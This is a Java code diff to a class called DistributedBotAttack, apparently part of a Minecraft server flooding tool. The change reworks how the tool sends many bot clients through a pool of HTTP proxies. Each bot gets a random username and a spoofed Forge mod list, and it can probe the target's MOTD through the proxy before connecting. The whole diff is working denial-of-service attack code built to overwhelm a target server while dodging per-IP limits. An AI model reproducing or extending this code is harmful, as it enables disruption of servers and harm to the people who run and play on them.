@@ -5,8 +5,8 @@ import java.io.OutputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
-import java.net.Proxy;
 import java.net.Socket;
+import java.net.Proxy;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -20,6 +20,7 @@ import com.github.steveice10.mc.protocol.packet.ingame.client.ClientTabCompleteP
 import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
 import com.github.steveice10.packetlib.Client;
+import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
 import com.github.steveice10.packetlib.tcp.TcpSessionFactory;
@@ -139,8 +140,8 @@ public class DistributedBotAttack extends IAttack{
             ProxyPool.proxys.forEach(p->{
                 try {
                     String[] _p=p.split(":");
-                    Proxy proxy=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
-                    Client client=createClient(ip, port,mainUtils.getRandomString(4,12),proxy);
+                    ProxyInfo proxyInfo=new ProxyInfo(ProxyInfo.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
+                    Client client=createClient(ip, port,mainUtils.getRandomString(4,12), proxyInfo);
                     client.getSession().setReadTimeout(10*1000);
                     client.getSession().setWriteTimeout(10*1000);
                     synchronized (clients) {
@@ -150,6 +151,7 @@ public class DistributedBotAttack extends IAttack{
 
                     if(this.attack_motdbefore) {
                         pool.submit(()->{
+                            Proxy proxy=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
                             getMotd(proxy,ip,port);
                             client.getSession().connect(false);
                         });
@@ -166,8 +168,8 @@ public class DistributedBotAttack extends IAttack{
         }
     }
 
-    public Client createClient(final String ip,int port,final String username, Proxy proxy) {
-        Client client=new Client(ip,port,new MinecraftProtocol(username), new TcpSessionFactory());
+    public Client createClient(final String ip,int port,final String username, ProxyInfo proxy) {
+        Client client=new Client(ip,port,new MinecraftProtocol(username), new TcpSessionFactory(proxy));
         new MCForge(client.getSession(),this.modList).init();
         client.getSession().addListener(new SessionListener() {
             public void packetReceived(PacketReceivedEvent e) {
@@ -211,7 +213,7 @@ public class DistributedBotAttack extends IAttack{
         return client;
     }
 
-    public boolean getMotd(Proxy proxy,String ip,int port) {
+    public boolean getMotd(Proxy proxy, String ip, int port) {
         try {
             Socket socket=new Socket(proxy);
             socket.connect(new InetSocketAddress(ip, port));
